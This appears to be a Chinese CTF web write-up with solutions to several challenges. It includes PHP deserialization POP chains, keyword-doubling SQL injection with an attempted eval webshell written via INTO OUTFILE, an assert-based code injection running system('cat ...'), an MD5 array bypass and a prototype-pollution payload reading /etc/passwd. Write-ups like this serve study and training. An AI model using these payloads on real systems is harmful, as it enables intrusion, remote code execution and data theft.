class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable language_">$this</span>-&gt;func) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="variable language_">$this</span>-&gt;arg)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            <span class="variable">$func</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$aaa</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>


<p>简单链子，触发A类的魔术变量__invoke，然后调用函数show，触发B类的魔术变量__toString，就调用到show函数了，<br>造poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$php</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">var</span> = <span class="keyword">new</span> B;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">var</span>-&gt;func=<span class="string">&quot;\create_function&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">var</span>-&gt;php=</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">var</span>-&gt;arg=<span class="string">&quot;;&#125;var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>先是利用<code>\create_function</code>绕过第一个过滤，该知识点可查看ctfshowweb入门php特性147，接着是第二个，过滤了相当多的东西，尤其是引号，导致即使有exec也没法命令执行，因为还过滤掉了可以造点号的<code>local</code></p>
<p>想到还有可以获取所以已定义变量的方法，也就是函数<code>get_defined_vars()</code>：<br>很遗憾是假flag，但告诉了真flag在哪里，<code>fl4g&#123;TrueFlag_is_in_Tru3flag.php&#125;</code></p>
<p>那么问题来了，怎么读取到<code>Tru3flag.php</code>，flag被ban，很难，但还好有rossweise（三月七）师傅提示我，让我没爆0</p>
<p><code>require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());</code></p>
<p>通过base64编码绕过对flag的过滤，然后包含，最后再次将所有变量读出</p>
<p>base64_decode不需要引号也能执行成功，新姿势，我太菜了，还是得多学</p>
<h2 id="ctfmanage"><a href="#ctfmanage" class="headerlink" title="ctfmanage"></a>ctfmanage</h2><p>将union,select,where都置换为空，可以作为绕过点，然后对or进行了过滤，检测到or就结束程序</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,(selunionect group_concat(table_name)frunionom infounionrmation_schema.tables whunionere table_schema<span class="operator">=</span>database());#</span><br></pre></td></tr></table></figure>
<p>得到两个表：flagisthere,ilikectf</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(a) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> liu_tbl)m;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,(selunionect group_concat(a,<span class="string">&#x27;|&#x27;</span>,b,<span class="string">&#x27;|&#x27;</span>,c)frunionom (selunionect <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c ununionion selselectect <span class="operator">*</span> frunionom flagisthere)m);#</span><br></pre></td></tr></table></figure>
<p>flagishere<br>1|2|3,1|youfindit|flag,2|???|?????????</p>
<p>ilikectf:</p>
<p>1|2|3,34475|djifeih|flag.php,36476|sgrsgef|gg.php</p>
<p>flag.php页面啥也没有，打开gg.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>先十六进制编码，再倒序，再十六进制转字符串，最后进行base64编码，将得到字符串与变量<code>$secret</code>进行强类型比较。</p>
<p>查一手文件上传：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,(selunionect group_concat(variable_name,<span class="string">&#x27;|&#x27;</span>,variable_value)frunionom perfounionrmance_schema.global_variables whunionere variable_name<span class="operator">=</span>&quot;secure_file_priv&quot;);#</span><br></pre></td></tr></table></figure>
<p>得到：<br>secure_file_priv|&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,(<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile<span class="string">&#x27;/var/lib/mysql-files/1.php&#x27;</span>);#</span><br></pre></td></tr></table></figure>
<p>上传一波：</p>
<p>HeroBravo Firewall</p>
<p>被墙了。老老实实做php特性了，但很明显首先不知道<code>$secret</code>的值，强类型比较不太好弄</p>
<p>可以看到，如果一个正常字符串，经过处理后得到的应该是base64编码，这种东西通常是作为提示的，可以在一开始进行sql注入的页面源码找到:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ/bGlg== --!&gt;</span><br></pre></td></tr></table></figure>

<p>经过反向处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>
<p>得到字符串：<code>ilovectfverymuch</code></p>
<p>数组绕过一下第二层，构造payload：</p>
<p>GET: <code>?sy=ilovectfverymuch</code><br>POST: <code>lo[]=a&amp;ha[]=b</code></p>
<h2 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h2><p>打开页面，写着一条链子，看页面源码啥也没有，有链子，应该需要源码泄露，看了一眼robots.txt不存在，然后<span class="exturl" data-url="aHR0cDovL3d3dy56aXAs5pyJ5LqGLw==">www.zip，有了</span></p>
<p>对带着命名空间的链子还不会写poc，通过一些查询终于搞出来了，但链子的结尾却是一个只能控制第一个参数的<code>call_user_func</code>函数，第二个参数被写了字符串<code>&#39;666&#39;</code>，<code>phpinfo</code>，执行页面也没看到有用的东西</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Method</span>\<span class="title class_">Func</span>&#123;</span><br><span class="line">    <span class="title class_">error_reporting</span>(0);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source-&gt;generate = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="keyword">new</span> GenerateFile;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source-&gt;flag = <span class="string">&quot;myTest&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;flag = <span class="keyword">new</span> Getdefault;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;    </span><br><span class="line">    <span class="title class_">error_reporting</span>(0);</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Method</span>\<span class="title">Func</span>\<span class="title">GetFile</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;defaultValue = <span class="keyword">new</span> GetFile;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Control</span>\<span class="title class_">State</span>&#123;</span><br><span class="line">    <span class="title class_">error_reporting</span>(0);</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">MyGenerator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes=[<span class="keyword">new</span> MyGenerator];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">error_reporting</span>(0);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> Control\State\<span class="title function_ invoke__">StopHook</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> Control\State\<span class="title function_ invoke__">StopHook</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="绿城杯"><a href="#绿城杯" class="headerlink" title="绿城杯"></a>绿城杯</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;link_page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$link_page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;link_page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$link_page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page_file</span> = <span class="string">&quot;pages/&quot;</span> . <span class="variable">$link_page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe_check1</span> = <span class="string">&quot;strpos(&#x27;<span class="subst">$page_file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$safe_check1</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// safe!</span></span><br><span class="line"><span class="variable">$safe_check2</span> = <span class="string">&quot;file_exists(&#x27;<span class="subst">$page_file</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$safe_check2</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no this file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$page_file</span>;</span><br></pre></td></tr></table></figure>
<p>拼接</p>
<p>检测目录穿越，检测文件是否存在，文件包含</p>
<p>尝试用数学运算进行rce:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;strpos(&#x27;/pages/   1&#x27;,&#x27;&#x27;)*phpinfo()*strpos(&#x27;2    .php&#x27;,&#x27;..&#x27;)===false&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功</p>
<p>读取：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27;)*system(&#x27;</span>cat pages/flag.php<span class="string">&#x27;)*strpos(&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//DASCTF&#123;f351aa459005805550dabad9bd8334f2&#125;; ?&gt;</span></span><br></pre></td></tr></table></figure>

<!-- nt官方，原来是不用交外面的格式，那你给我干什么，浪费我时间 -->

<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>注册了个账号，没找到信息</p>
<h3 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h3><p>页面源码有个提示<code>&lt;!-- /source.zip --!&gt;</code>，下载了解了个<code>config.js</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">app, fs, lodash</span>)&#123;</span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> config = res.<span class="property">locals</span>.<span class="property">config</span>;</span><br><span class="line">        <span class="keyword">let</span> content = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(fs.<span class="title function_">readFileSync</span>(config.<span class="property">filepath</span>).<span class="title function_">toString</span>())</span><br><span class="line">        res.<span class="title function_">json</span>(content);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    app.<span class="title function_">post</span>(<span class="string">&#x27;/validated/:library?/:method?&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> config = res.<span class="property">locals</span>.<span class="property">config</span>;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">params</span>.<span class="property">library</span> || req.<span class="property">params</span>.<span class="property">library</span>.<span class="title function_">match</span>(<span class="regexp">/vm/i</span>)|| req.<span class="property">params</span>.<span class="property">library</span>.<span class="title function_">match</span>(<span class="regexp">/../i</span>)|| req.<span class="property">params</span>.<span class="property">library</span>.<span class="title function_">match</span>(<span class="regexp">/%2f/i</span>)|| req.<span class="property">params</span>.<span class="property">library</span>.<span class="title function_">match</span>(<span class="regexp">/%2F/i</span>)|| req.<span class="property">params</span>.<span class="property">library</span>.<span class="title function_">match</span>(<span class="regexp">/\//i</span>)) req.<span class="property">params</span>.<span class="property">library</span> = <span class="string">&quot;json-schema&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">params</span>.<span class="property">method</span>) req.<span class="property">params</span>.<span class="property">method</span> = <span class="string">&quot;validate&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> json_library = <span class="built_in">require</span>(req.<span class="property">params</span>.<span class="property">library</span>)</span><br><span class="line">        <span class="keyword">let</span> valid = json_library[req.<span class="property">params</span>.<span class="property">method</span>](req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">if</span> (!valid) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;validator failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> p;</span><br><span class="line">        <span class="keyword">if</span> (config.<span class="property">path</span>) &#123;</span><br><span class="line">            p = config.<span class="property">path</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.<span class="property">filepath</span>) &#123;</span><br><span class="line">            p = config.<span class="property">filepath</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p = <span class="string">&quot;config.json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(p).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            content = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(content)</span><br><span class="line">            <span class="keyword">if</span> (lodash.<span class="title function_">isEqual</span>(req.<span class="property">body</span>, content))</span><br><span class="line">                res.<span class="title function_">json</span>(content)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                res.<span class="title function_">send</span>(&#123; <span class="string">&quot;validator&quot;</span>: valid, <span class="string">&quot;content&quot;</span> : content, <span class="string">&quot;log&quot;</span>: <span class="string">&quot;wrong content&quot;</span>&#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(&#123; <span class="string">&quot;validator&quot;</span>: valid, <span class="string">&quot;content&quot;</span> : content&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/etc/passwd&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// &#123;&quot;validator&quot;:&#123;&quot;valid&quot;:true,&quot;error&quot;:[]&#125;,&quot;content&quot;:&quot;111&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>赛后复现</p>
<p>首先看到这里：</p>
<blockquote>
<p>let content &#x3D; fs.readFileSync(p).toString()</p>
</blockquote>
<p>使用了<code>fs.readFileSync()</code>函数读取了文件，并将其强转为字符串并赋值给content</p>
<blockquote>
<p>content &#x3D; JSON.parse(content)</p>
</blockquote>
<p>使用<code>JSON.parse</code>将字符串转为一个js对象</p>
<blockquote>
<p>lodash.isEqual(req.body, content)</p>
</blockquote>
<p>判断req.body与content的相等</p>
<p>不相等则会将content的值直接输出：</p>
<blockquote>
<p>res.send({ “validator”: valid, “content” : content, “log”: “wrong content”})</p>
</blockquote>
<p>于是就可以将文件内容带出来</p>
<p>于是回过头看看如何控制p的值</p>
